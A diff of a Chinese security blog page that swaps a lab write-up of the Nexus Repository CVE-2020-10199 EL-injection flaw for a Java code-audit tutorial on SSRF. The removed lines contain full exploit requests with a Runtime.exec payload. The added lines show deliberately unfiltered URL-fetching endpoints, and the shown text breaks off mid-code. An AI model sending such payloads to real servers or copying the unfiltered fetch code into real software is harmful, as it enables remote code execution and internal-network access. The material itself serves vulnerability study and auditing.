@@ -4,7 +4,7 @@
 
 <head>
     <meta charset="utf-8">
-    <meta name="keywords" content="CVE-2020-10199漏洞分析, 渗透测试,漏洞挖掘,攻防对抗">
+    <meta name="keywords" content="java代码审计之SSRF, 渗透测试,漏洞挖掘,攻防对抗">
     <meta name="description" content="">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
@@ -16,7 +16,7 @@
     <!-- Global site tag (gtag.js) - Google Analytics -->
 
 
-    <title>CVE-2020-10199漏洞分析 | m1k0er&#39;Blogs</title>
+    <title>java代码审计之SSRF | m1k0er&#39;Blogs</title>
     <link rel="icon" type="image/jpeg" href="/medias/2.jpeg">
 
     <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.css">
@@ -290,12 +290,12 @@
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/3.jpg')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/5.jpg')">
     <div class="container" style="right: 0px;left: 0px;">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
-                    <h1 class="description center-align post-title">CVE-2020-10199漏洞分析</h1>
+                    <h1 class="description center-align post-title">java代码审计之SSRF</h1>
                 </div>
             </div>
         </div>
@@ -436,7 +436,7 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
-                    2022-11-25
+                    2022-11-30
                 </div>
                 
 
@@ -457,119 +457,129 @@
 
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>做事，不怕速度慢，只怕原地站。</p>
-<h2 id="0x01-简介"><a href="#0x01-简介" class="headerlink" title="0x01 简介"></a>0x01 简介</h2><p>Nexus Repository OSS是一款通用的软件包仓库管理（Universal Repository Manager）服务，在版本为&lt;= 3.21.1时，攻击者可以通过<code>/service/rest/beta/repositories/go/group</code>接口(至少需要一个低权限以上的账号才能访问)来构造恶意的数据，在渲染数据时造成EL表达式注入，导致可远程执行任意命令，该漏洞在3.21.2被修复。</p>
-<h2 id="0x02-环境搭建"><a href="#0x02-环境搭建" class="headerlink" title="0x02 环境搭建"></a>0x02 环境搭建</h2><p>1、拉取镜像</p>
-<pre><code>docker pull sonatype/nexus3:3.21.1</code></pre>
-<p>2、启动镜像</p>
-<pre><code>ocker run -d -p 8081:8081 -p 8000:8000 --name nexus -e INSTALL4J_ADD_VM_PARAMS=&quot;-Xms2g -Xmx2g -XX:MaxDirectMemorySize=3g -Djava.util.prefs.userRoot=$&#123;NEXUS_DATA&#125;/javaprefs -Dstorage.diskCache.diskFreeSpaceLimit=1024 -agentlib:jdwp=transport=dt_socket,server=y,suspend=n,address=8000&quot; sonatype/nexus3:3.21.0</code></pre>
-<p>这里的8081是web端口，8000是JDWP调试端口映射。</p>
-<p>3、idea远程debug</p>
-<p><img src="https://pingo78.oss-cn-hangzhou.aliyuncs.com/images/image-20221125232139782.png"></p>
-<p>下载nexus源码</p>
-<pre><code>https://github.com/sonatype/nexus-public/archive/refs/tags/release-3.21.0-05.zip</code></pre>
-<h2 id="0x03-漏洞复现"><a href="#0x03-漏洞复现" class="headerlink" title="0x03 漏洞复现"></a>0x03 漏洞复现</h2><p>初次登录时，账号为admin，密码在/opt/sonatype/sonatype-work/nexus3/admin.password中，复制并修改密码。</p>
-<p><img src="https://pingo78.oss-cn-hangzhou.aliyuncs.com/images/image-20221125233241828.png"></p>
-<p>获取数据包中的NX-ANTI-CSRF-TOKEN和NXSESSIONID，并替换到以下poc发送数据包</p>
-<pre><code>POST /service/rest/beta/repositories/go/group HTTP/1.1
-Host: 192.168.52.130:8081
-Content-Length: 205
-accept: application/json
-User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36
-NX-ANTI-CSRF-TOKEN: 0.9539500051742233
-Content-Type: application/json
-Origin: http://192.168.52.130:8081
-Referer: http://192.168.52.130:8081/swagger-ui/?_v=3.21.0-05&amp;_e=OSS
-Accept-Encoding: gzip, deflate
-Accept-Language: zh-CN,zh;q=0.9
-Cookie: NX-ANTI-CSRF-TOKEN=0.9539500051742233; NXSESSIONID=513ba1d6-3c5b-4fdd-826f-ec4341ddc723
-dnt: 1
-sec-gpc: 1
-Connection: close
+                <h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>当没人知道你在干嘛时，生活会变得更好。</p>
+<h2 id="0x01-SSRF？"><a href="#0x01-SSRF？" class="headerlink" title="0x01 SSRF？"></a>0x01 SSRF？</h2><p>​        SSRF（Server-Side Request Forgery）服务端请求为伪造，它是一种由攻击者构造恶意请求形成由服务端发起请求的一个安全漏洞。一般情况下，由于SSRF漏洞是由服务端发起的，所以它能够请求到与它相连而与外网隔离的内部系统，因此它的目标是从外网无法访问的内部系统。通过访问内部系统来获取敏感数据，严重可获取服务器权限。</p>
+<h2 id="0x02-常见漏洞接口"><a href="#0x02-常见漏洞接口" class="headerlink" title="0x02 常见漏洞接口"></a>0x02 常见漏洞接口</h2><p>以下几种是在java中能发起HTTP请求的方法，在代码审计中需要特别留意</p>
+<pre><code>HttpURLConnection.getInputStream
+URLConnection.getInputStream
+HttpClient.execute
+OkHttpClient.netCall.execute
+Request.Get.execute
+Request.Post.execute
+URL.openStream
+ImageIO.read</code></pre>
+<p>以上方法均可以发起网络请求，但是支持sun.net.<a target="_blank" rel="noopener" href="http://www.protocol下所有协议的,只有urlconnection和url./">www.protocol下所有协议的，只有URLConnection和URL。</a></p>
+<h3 id="1、HttpURLConnection"><a href="#1、HttpURLConnection" class="headerlink" title="1、HttpURLConnection"></a>1、HttpURLConnection</h3><p>HttpURLConnection是java的标准类，它继承于URLConnection，可用于向url发送http请求，在没有任何过滤的情况下会导致SSRF的产生。</p>
+<pre class="line-numbers language-java"><code class="language-java"><span class="token annotation punctuation">@GetMapping</span><span class="token punctuation">(</span><span class="token string">"/HttpURLConnection/vul"</span><span class="token punctuation">)</span>
+<span class="token keyword">public</span> String <span class="token function">httpURLConnection</span><span class="token punctuation">(</span><span class="token annotation punctuation">@RequestParam</span> String url<span class="token punctuation">)</span> <span class="token punctuation">{</span>
+    <span class="token keyword">try</span> <span class="token punctuation">{</span>
+        URL u <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">URL</span><span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token punctuation">;</span>
+        URLConnection urlConnection <span class="token operator">=</span> u<span class="token punctuation">.</span><span class="token function">openConnection</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        HttpURLConnection httpUrl <span class="token operator">=</span> <span class="token punctuation">(</span>HttpURLConnection<span class="token punctuation">)</span>urlConnection<span class="token punctuation">;</span>
+        BufferedReader in <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">BufferedReader</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">InputStreamReader</span><span class="token punctuation">(</span>httpUrl<span class="token punctuation">.</span><span class="token function">getInputStream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        String inputLine<span class="token punctuation">;</span>
+        StringBuffer html <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">StringBuffer</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token keyword">while</span><span class="token punctuation">(</span><span class="token punctuation">(</span>inputLine <span class="token operator">=</span> in<span class="token punctuation">.</span><span class="token function">readLine</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">!=</span>null<span class="token punctuation">)</span><span class="token punctuation">{</span>
+            html<span class="token punctuation">.</span><span class="token function">append</span><span class="token punctuation">(</span>inputLine<span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token punctuation">}</span>
+        in<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token keyword">return</span> html<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">SSRFException</span> <span class="token operator">|</span> IOException e<span class="token punctuation">)</span> <span class="token punctuation">{</span>
+        <span class="token keyword">return</span> e<span class="token punctuation">.</span><span class="token function">getMessage</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<h3 id="2、URLConnection"><a href="#2、URLConnection" class="headerlink" title="2、URLConnection"></a>2、URLConnection</h3><p>URLConnection是一个抽象类，表示指向URL指定资源的活动链接，除了上面我们提到的HttpURLConnection以外，他还有一个子类是JarURLConnection。</p>
+<pre class="line-numbers language-java"><code class="language-java"><span class="token annotation punctuation">@RequestMapping</span><span class="token punctuation">(</span>value <span class="token operator">=</span> <span class="token string">"/urlConnection/vuln"</span><span class="token punctuation">,</span> method <span class="token operator">=</span> <span class="token punctuation">{</span>RequestMethod<span class="token punctuation">.</span>POST<span class="token punctuation">,</span> RequestMethod<span class="token punctuation">.</span>GET<span class="token punctuation">}</span><span class="token punctuation">)</span>
+<span class="token keyword">public</span> String <span class="token function">URLConnectionVuln</span><span class="token punctuation">(</span>String url<span class="token punctuation">)</span> <span class="token punctuation">{</span>
+    <span class="token keyword">return</span> HttpUtils<span class="token punctuation">.</span><span class="token function">URLConnection</span><span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+<h3 id="3、HttpClient"><a href="#3、HttpClient" class="headerlink" title="3、HttpClient"></a>3、HttpClient</h3><p>HttpClient是一个高效、功能丰富的客户端编程工具包，在没有任何过滤的情况下，会产生ssrf漏洞。</p>
+<pre class="line-numbers language-java"><code class="language-java"><span class="token annotation punctuation">@GetMapping</span><span class="token punctuation">(</span><span class="token string">"/httpclient/vul"</span><span class="token punctuation">)</span>
+<span class="token keyword">public</span> String <span class="token function">HttpClient</span><span class="token punctuation">(</span><span class="token annotation punctuation">@RequestParam</span> String url<span class="token punctuation">)</span> <span class="token punctuation">{</span>
 
-&#123;
-  &quot;name&quot;: &quot;internal&quot;,
-  &quot;online&quot;: true,
-  &quot;storage&quot;: &#123;
-    &quot;blobStoreName&quot;: &quot;default&quot;,
-    &quot;strictContentTypeValidation&quot;: true
-  &#125;,
-  &quot;group&quot;: &#123;
-    &quot;memberNames&quot;: [&quot;$&#123;&#39;root0ER&#39;.toUpperCase()&#125;&quot;]
-  &#125;
-&#125;</code></pre>
-<p><img src="https://pingo78.oss-cn-hangzhou.aliyuncs.com/images/image-20221125233821775.png"></p>
-<p>执行命令</p>
-<pre><code>POST /service/rest/beta/repositories/go/group HTTP/1.1
-Host: 192.168.52.130:8081
-Content-Length: 285
-accept: application/json
-User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36
-NX-ANTI-CSRF-TOKEN: 0.9539500051742233
-Content-Type: application/json
-Origin: http://192.168.52.130:8081
-Referer: http://192.168.52.130:8081/swagger-ui/?_v=3.21.0-05&amp;_e=OSS
-Accept-Encoding: gzip, deflate
-Accept-Language: zh-CN,zh;q=0.9
-Cookie: NX-ANTI-CSRF-TOKEN=0.9539500051742233; NXSESSIONID=513ba1d6-3c5b-4fdd-826f-ec4341ddc723
-dnt: 1
-sec-gpc: 1
-Connection: close
+    <span class="token keyword">try</span> <span class="token punctuation">{</span>
+        client<span class="token punctuation">.</span><span class="token function">execute</span><span class="token punctuation">(</span>httpGet<span class="token punctuation">)</span><span class="token punctuation">;</span>
+        BufferedReader in <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">BufferedReader</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">InputStreamReader</span><span class="token punctuation">(</span>client<span class="token punctuation">.</span><span class="token function">execute</span> <span class="token punctuation">(</span>httpGet<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getEntity</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getContent</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        StringBuffer html <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">StringBuffer</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        String inputLine <span class="token operator">=</span> <span class="token string">""</span><span class="token punctuation">;</span>
+        <span class="token keyword">while</span><span class="token punctuation">(</span><span class="token punctuation">(</span>inputLine <span class="token operator">=</span> in<span class="token punctuation">.</span><span class="token function">readLine</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">!=</span>null<span class="token punctuation">)</span><span class="token punctuation">{</span>
+            html<span class="token punctuation">.</span><span class="token function">append</span><span class="token punctuation">(</span>inputLine<span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token punctuation">}</span>
+        in<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token keyword">return</span> html<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">SSRFException</span> <span class="token operator">|</span> IOException e<span class="token punctuation">)</span> <span class="token punctuation">{</span>
+        <span class="token keyword">return</span> e<span class="token punctuation">.</span><span class="token function">getMessage</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<h3 id="4、OkHttpClient"><a href="#4、OkHttpClient" class="headerlink" title="4、OkHttpClient"></a>4、OkHttpClient</h3><p>OkHttpClient是java中一个高效的HTTP客户端，在没有任何过滤下可导致ssrf的产生。</p>
+<pre class="line-numbers language-java"><code class="language-java"><span class="token annotation punctuation">@GetMapping</span><span class="token punctuation">(</span><span class="token string">"/Okhttpclient/vul"</span><span class="token punctuation">)</span>
+<span class="token keyword">public</span> String <span class="token function">OkHttpClient</span><span class="token punctuation">(</span><span class="token annotation punctuation">@RequestParam</span> String url<span class="token punctuation">)</span> <span class="token punctuation">{</span>
+    OkHttpClient client <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">OkHttpClient<span class="token punctuation">.</span>Builder</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+        <span class="token punctuation">.</span><span class="token function">connectTimeout</span><span class="token punctuation">(</span><span class="token number">20</span><span class="token punctuation">,</span> TimeUnit<span class="token punctuation">.</span>SECONDS<span class="token punctuation">)</span>
+        <span class="token punctuation">.</span><span class="token function">writeTimeout</span><span class="token punctuation">(</span><span class="token number">20</span><span class="token punctuation">,</span>TimeUnit<span class="token punctuation">.</span>SECONDS<span class="token punctuation">)</span>
+        <span class="token punctuation">.</span><span class="token function">readTimeout</span><span class="token punctuation">(</span><span class="token number">20</span><span class="token punctuation">,</span>TimeUnit<span class="token punctuation">.</span>SECONDS<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">build</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 
-&#123;
-  &quot;name&quot;: &quot;internal&quot;,
-  &quot;online&quot;: true,
-  &quot;storage&quot;: &#123;
-    &quot;blobStoreName&quot;: &quot;default&quot;,
-    &quot;strictContentTypeValidation&quot;: true
-  &#125;,
-  &quot;group&quot;: &#123;
-    &quot;memberNames&quot;: [&quot;$&#123;&#39;a&#39;.getClass().forName(&#39;java.lang.Runtime&#39;).getDeclaredMethod(&#39;getRuntime&#39;).invoke(&#39;a&#39;.getClass().forName(&#39;java.lang.Runtime&#39;)).exec(&#39;touch /tmp/success&#39;)&#125;&quot;]
-  &#125;
-&#125;</code></pre>
-<p><img src="https://pingo78.oss-cn-hangzhou.aliyuncs.com/images/image-20221125235052498.png"></p>
-<h2 id="0x04-漏洞分析"><a href="#0x04-漏洞分析" class="headerlink" title="0x04 漏洞分析"></a>0x04 漏洞分析</h2><h3 id="1、反推法"><a href="#1、反推法" class="headerlink" title="1、反推法"></a>1、反推法</h3><p>首先先来对比下漏洞版本和修复版本的差异，除了可以通过github来对比外，也可以通过Beyond_Compare来对比差异</p>
-<pre><code>https://github.com/sonatype/nexus-public/compare/release-3.21.0-05...release-3.21.2-03?diff=split</code></pre>
-<p><img src="https://pingo78.oss-cn-hangzhou.aliyuncs.com/images/image-20221126002021117.png"></p>
-<p>可以看到在3.21.2-03版本修复的方式是通过getEscapeHelper().stripJavaEl对数据进行过滤。</p>
-<p><img src="https://pingo78.oss-cn-hangzhou.aliyuncs.com/images/image-20221126002514577.png"></p>
-<p>如果分析过CVE-2018-16621与CVE-2020-10204的师傅会发现这个漏洞跟前两个cve一样，都是buildConstraintViolationWithTemplate过滤不当导致的EL表达式注入，我们全局搜索下buildConstraintViolationWithTemplate，定位到关键位置为：<code>src/main/java/org/sonatype/nexus/validation/ConstraintViolationFactory</code>，这里没有经过getEscapeHelper().stripJavaEl进行过滤。</p>
-<p>在HelperValidator类的isValid方法调用了buildConstraintViolationWithTemplate</p>
-<p><img src="https://pingo78.oss-cn-hangzhou.aliyuncs.com/images/image-20221126005449709.png"></p>
-<p>继续分析发现HelperValidator被注解在HelperAnnotation接口上</p>
-<p><img src="https://pingo78.oss-cn-hangzhou.aliyuncs.com/images/image-20221126005655618.png"></p>
-<p>同样，HelperAnnotation注解在HelperBean上</p>
-<p><img src="https://pingo78.oss-cn-hangzhou.aliyuncs.com/images/image-20221126005739179.png"></p>
-<p>在第64行构建了HelperBean对象</p>
-<p><img src="https://pingo78.oss-cn-hangzhou.aliyuncs.com/images/image-20221126005950292.png"></p>
-<p>因此我们只需要看看谁调用了createViolation即可，全局搜索constraintViolationFactory.createViolation发现，在<code>src/main/java/org/sonatype/nexus/repository/rest/api/AbstractGroupRepositoriesApiResource</code>调用了createViolation</p>
-<p><img src="https://pingo78.oss-cn-hangzhou.aliyuncs.com/images/image-20221126010357373.png"></p>
-<p>继续往上跟进，看看哪里调用了validateGroupMembers方法，在<code>src/main/java/org/sonatype/nexus/repository/rest/api/AbstractGroupRepositoriesApiResource.java</code>的第66行调用了validateGroupMembers方法。</p>
-<p><img src="https://pingo78.oss-cn-hangzhou.aliyuncs.com/images/image-20221126010615528.png"></p>
-<p>同样在<code>src/main/java/org/sonatype/nexus/repository/golang/rest/GolangGroupRepositoriesApiResource.java</code>中的第83行调用了createRepository，路由地址也和poc中给出的路径对上了。</p>
-<p><img src="https://pingo78.oss-cn-hangzhou.aliyuncs.com/images/image-20221126011227075.png"></p>
-<p>通过这种反推的方式我们可以对比版本间的差异来更快捕获到漏洞点。</p>
-<h3 id="2、正推法"><a href="#2、正推法" class="headerlink" title="2、正推法"></a>2、正推法</h3><p>全局搜索关键路径<code>go/group</code>，定位到相应的java类文件<code>src/main/java/org/sonatype/nexus/repository/golang/rest/GolangGroupRepositoriesApiResource</code>，根据请求方法定位到@POST注解下的createRepository方法，在该处下一个断点。</p>
-<p><img src="https://pingo78.oss-cn-hangzhou.aliyuncs.com/images/image-20221126024837334.png"></p>
-<p>这里调用了父类的createRepository，跟进到createRepository</p>
-<p><img src="https://pingo78.oss-cn-hangzhou.aliyuncs.com/images/image-20221126025149373.png"></p>
-<p>继续跟进到validateGroupMembers，此时memberNames为一个数组，在第86行遍历memberNames中的元素，通过repositoryManager.get(repositoryName)获取仓库名，如果为null，则进行else流程，进入constraintViolationFactory.createViolation，我们跟进去看看</p>
-<p><img src="https://pingo78.oss-cn-hangzhou.aliyuncs.com/images/image-20221126025851800.png"></p>
-<p>在第64行新建了一个HelperBean对象，并将poc传入其中，</p>
-<p><img src="https://pingo78.oss-cn-hangzhou.aliyuncs.com/images/image-20221126025946164.png"></p>
-<p>逐渐跟进，跟进到validateConstraints方法，跟进addConstraintFailure</p>
-<p><img src="https://pingo78.oss-cn-hangzhou.aliyuncs.com/images/image-20221126014656625.png"></p>
-<p>在addConstraintFailure中，通过constraintViolationCreationContext.getMessage()获取我们的EL表达式，然后传递到interpolate方法执行表达式，我们跟进到interpolate中</p>
-<p><img src="https://pingo78.oss-cn-hangzhou.aliyuncs.com/images/image-20221126014914374.png"></p>
-<p>跟进到this.validatorScopedContext.getMessageInterpolator().interpolate中</p>
-<p><img src="https://pingo78.oss-cn-hangzhou.aliyuncs.com/images/image-20221126015909067.png"></p>
-<p>继续跟进到interpolateMessage</p>
-<p><img src="https://pingo78.oss-cn-hangzhou.aliyuncs.com/images/image-20221126015956031.png"></p>
-<p>后面一步步跟进后，会调用<code>org\hibernate\validator\hibernate-validator\6.1.0.Final\hibernate-validator-6.1.0.Final.jar!\org\hibernate\validator\internal\engine\messageinterpolation\ElTermResolver</code>的interpolate方法，在第39行进行渲染完成RCE。</p>
-<p><img src="https://pingo78.oss-cn-hangzhou.aliyuncs.com/images/image-20221126021010095.png"></p>
-<h2 id="0x05-参考资料"><a href="#0x05-参考资料" class="headerlink" title="0x05 参考资料"></a>0x05 参考资料</h2><p><a target="_blank" rel="noopener" href="https://paper.seebug.org/1166/#cve-2020-10199">https://paper.seebug.org/1166/#cve-2020-10199</a></p>
-<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/8299#toc-11">https://xz.aliyun.com/t/8299#toc-11</a></p>
-<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/magic-zero/p/12641068.html">https://www.cnblogs.com/magic-zero/p/12641068.html</a></p>
+    Request request <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Request<span class="token punctuation">.</span>Builder</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+        <span class="token punctuation">.</span><span class="token function">url</span><span class="token punctuation">(</span>url<span class="token punctuation">)</span>
+        <span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+        <span class="token punctuation">.</span><span class="token function">build</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token keyword">try</span><span class="token punctuation">{</span>
+        Response response <span class="token operator">=</span> client<span class="token punctuation">.</span><span class="token function">newCall</span><span class="token punctuation">(</span>request<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">execute</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        String responseString <span class="token operator">=</span> response<span class="token punctuation">.</span><span class="token function">body</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">string</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token keyword">return</span> responseString<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span><span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Exception</span> e<span class="token punctuation">)</span><span class="token punctuation">{</span>
+        <span class="token keyword">return</span> e<span class="token punctuation">.</span><span class="token function">getMessage</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<h3 id="5、Request"><a href="#5、Request" class="headerlink" title="5、Request"></a>5、Request</h3><p>同Python的Request模块一样，也会发起http请求。漏洞代码如下：</p>
+<pre class="line-numbers language-java"><code class="language-java"><span class="token annotation punctuation">@GetMapping</span><span class="token punctuation">(</span><span class="token string">"/request/vul"</span><span class="token punctuation">)</span>
+<span class="token keyword">public</span> String <span class="token function">request</span><span class="token punctuation">(</span><span class="token annotation punctuation">@RequestParam</span> String url<span class="token punctuation">)</span> <span class="token punctuation">{</span>
+    <span class="token keyword">try</span> <span class="token punctuation">{</span>
+        <span class="token keyword">return</span> Request<span class="token punctuation">.</span><span class="token function">Get</span><span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">execute</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">returnContent</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">SSRFException</span> <span class="token operator">|</span> IOException e<span class="token punctuation">)</span> <span class="token punctuation">{</span>
+        <span class="token keyword">return</span> e<span class="token punctuation">.</span><span class="token function">getMessage</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<h3 id="6、openStream"><a href="#6、openStream" class="headerlink" title="6、openStream"></a>6、openStream</h3><p>通过URL对象的openStream方法，可以得到指定资源的输入流，如果对指定的资源，即传入的url没有加以过滤，则会产生SSRF漏洞。</p>
+<pre class="line-numbers language-java"><code class="language-java"><span class="token annotation punctuation">@GetMapping</span><span class="token punctuation">(</span><span class="token string">"/openStream"</span><span class="token punctuation">)</span>
+<span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">openStream</span><span class="token punctuation">(</span><span class="token annotation punctuation">@RequestParam</span> String url<span class="token punctuation">,</span> HttpServletResponse response<span class="token punctuation">)</span> <span class="token keyword">throws</span> IOException <span class="token punctuation">{</span>
+    InputStream inputStream <span class="token operator">=</span> null<span class="token punctuation">;</span>
+    OutputStream outputStream <span class="token operator">=</span> null<span class="token punctuation">;</span>
+    <span class="token keyword">try</span> <span class="token punctuation">{</span>
+        String downLoadImgFileName <span class="token operator">=</span> WebUtils<span class="token punctuation">.</span><span class="token function">getNameWithoutExtension</span><span class="token punctuation">(</span>url<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"."</span> <span class="token operator">+</span> WebUtils<span class="token punctuation">.</span><span class="token function">getFileExtension</span><span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token comment" spellcheck="true">// download</span>
+        response<span class="token punctuation">.</span><span class="token function">setHeader</span><span class="token punctuation">(</span><span class="token string">"content-disposition"</span><span class="token punctuation">,</span> <span class="token string">"attachment;fileName="</span> <span class="token operator">+</span> downLoadImgFileName<span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+        URL u <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">URL</span><span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token keyword">int</span> length<span class="token punctuation">;</span>
+        <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> bytes <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">byte</span><span class="token punctuation">[</span><span class="token number">1024</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+        inputStream <span class="token operator">=</span> u<span class="token punctuation">.</span><span class="token function">openStream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// send request</span>
+        outputStream <span class="token operator">=</span> response<span class="token punctuation">.</span><span class="token function">getOutputStream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>length <span class="token operator">=</span> inputStream<span class="token punctuation">.</span><span class="token function">read</span><span class="token punctuation">(</span>bytes<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+            outputStream<span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span>bytes<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> length<span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token punctuation">}</span>
+
+    <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Exception</span> e<span class="token punctuation">)</span> <span class="token punctuation">{</span>
+        logger<span class="token punctuation">.</span><span class="token function">error</span><span class="token punctuation">(</span>e<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span> <span class="token keyword">finally</span> <span class="token punctuation">{</span>
